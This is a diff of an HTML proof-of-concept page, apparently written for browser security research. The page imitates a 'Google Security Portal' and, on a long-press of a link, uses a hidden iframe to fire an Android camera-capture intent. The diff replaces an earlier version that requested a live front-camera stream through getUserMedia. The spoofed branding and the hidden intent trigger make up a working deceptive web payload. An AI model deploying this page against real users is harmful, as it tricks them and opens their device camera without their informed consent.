@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Preview Page & Camera Capture Escalation PoC</title>
+    <title>Preview Page & Android Camera Intent PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -60,11 +60,6 @@
             display: none;
             text-align: left;
         }
-        .info-box img, .info-box video {
-            width: 100%;
-            border-radius: 6px;
-            margin-top: 8px;
-        }
         .footer-note {
             margin-top: 30px;
             font-size: 11px;
@@ -85,12 +80,12 @@
 <body>
 
     <div class="banner">Google Security Portal</div>
-    <h1>Preview Page & Camera Capture Escalation</h1>
+    <h1>Preview Page & Android Camera Intent</h1>
 
     <!-- Target Link dengan Preview Page (target="_blank") -->
-    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Camera Access</a>
+    <a href="https://google.com" target="_blank" rel="noopener noreferrer" class="spoof-link" id="targetLink">Long Press -> Preview Page & Android Camera</a>
 
-    <!-- Kotak Informasi penampil status & hasil tangkapan kamera -->
+    <!-- Kotak Informasi Status -->
     <div class="info-box" id="infoBox">
         <strong>Status:</strong> <span id="statusText" class="pulse">Waiting for interaction...</span><br>
         <div id="cameraDetails" style="margin-top: 8px;"></div>
@@ -99,40 +94,34 @@
     <div class="footer-note">Cloud-secured verification system.</div>
 
     <script>
-        document.addEventListener("contextmenu", async (e) => {
+        document.addEventListener("contextmenu", (e) => {
             const infoBox = document.getElementById("infoBox");
             const statusText = document.getElementById("statusText");
             const cameraDetails = document.getElementById("cameraDetails");
 
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Triggering preview page & requesting camera access...";
+            statusText.innerText = "Triggering preview page & launching Android Camera app...";
 
-            setTimeout(async () => {
+            setTimeout(() => {
                 try {
-                    // Meminta akses stream kamera perangkat secara langsung
-                    const constraints = {
-                        video: { facingMode: "user" }, // Bisa diganti "environment" untuk kamera belakang
-                        audio: false
-                    };
+                    // Memicu Android Intent untuk membuka aplikasi Kamera sistem secara langsung
+                    const intentFrame = document.createElement('iframe');
+                    intentFrame.style.display = 'none';
+                    intentFrame.src = "intent:#Intent;action=android.media.action.IMAGE_CAPTURE;end;";
+                    document.body.appendChild(intentFrame);
+                    
+                    setTimeout(() => {
+                        document.body.removeChild(intentFrame);
+                    }, 1000);
 
-                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                    
                     statusText.className = "";
-                    statusText.innerText = "Camera Stream Active Successfully!";
-                    
-                    // Menampilkan live video stream langsung ke dalam info box
-                    cameraDetails.innerHTML = `
-                        <b>Live Feed:</b><br>
-                        <video id="camStream" autoplay playsinline style="width:100%; background:#000;"></video>
-                    `;
-                    
-                    const videoElement = document.getElementById("camStream");
-                    videoElement.srcObject = stream;
+                    statusText.innerText = "Android Camera Intent Dispatched!";
+                    cameraDetails.innerHTML = "<b>Action:</b> System camera application requested via intent scheme.";
 
                 } catch (err) {
                     statusText.className = "";
-                    statusText.innerText = `Camera access denied or blocked: ${err.message}`;
+                    statusText.innerText = `Intent execution failed: ${err.message}`;
                 }
             }, 3000); // Jeda 3 detik sesuai logika asli Anda
         });
